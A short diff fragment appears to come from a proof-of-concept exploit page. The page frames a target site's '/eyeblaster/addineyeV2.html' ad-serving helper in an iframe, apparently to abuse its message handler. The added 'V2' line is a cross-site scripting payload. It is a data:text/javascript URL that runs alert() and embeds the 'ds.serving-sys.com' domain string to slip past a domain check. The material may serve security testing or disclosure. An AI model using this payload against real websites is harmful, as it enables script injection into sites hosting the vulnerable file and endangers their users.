@@ -11,3 +11,8 @@ function receiveMessage(event)
 </head><body>
 <iframe id="if" src="<TARGET>/eyeblaster/addineyeV2.html"></iframe>
 </body></html>
+
+
+
+// V2:
+data:text/javascript,alert();var x=/ds.serving-sys.com/.source;//#https://
